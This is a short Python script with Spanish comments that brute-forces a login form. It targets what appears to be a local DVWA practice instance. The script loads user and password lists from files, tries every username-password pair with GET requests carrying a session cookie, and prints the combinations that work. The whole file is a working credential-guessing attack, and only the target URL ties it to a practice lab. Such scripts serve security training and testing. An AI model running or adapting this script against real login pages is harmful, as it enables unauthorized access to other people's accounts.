import requests

url = 'http://localhost:8080/vulnerabilities/brute/'

password_file = 'pass.txt'
users_file = 'user.txt'

# cabeceras
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Referer': url,
    'Cookie': 'security=low; PHPSESSID=ff719030c776091862a0999dc28a5920'
}

# Lista para almacenar los intentos exitosos
successful_logins = []

# para probar
def login(username, password):
    params = {
        'username': username,
        'password': password,
        'Login': 'Login'
    }
    response = requests.get(url, headers=headers, params=params)
    
    if "Welcome to the password protected area" in response.text:
        print(f"Inicio de sesión exitoso con {username}:{password}")
        successful_logins.append((username, password))
        return True
    return False

# leer y probar manualmente con un for doble cada usuario con cada contraseña (combinaciones)
with open(password_file, 'r') as pass_file, open(users_file, 'r') as user_file:
    passwords = [line.strip() for line in pass_file]
    users = [line.strip() for line in user_file]

    for password in passwords:
        for user in users:
            login(user, password)

# mostrar sesiones correctas
print("\nHistorial de intentos exitosos:")
if successful_logins:
    for username, password in successful_logins:
        print(f"Usuario: {username}, Contraseña: {password}")
else:
    print("No hubo inicios de sesión exitosos.")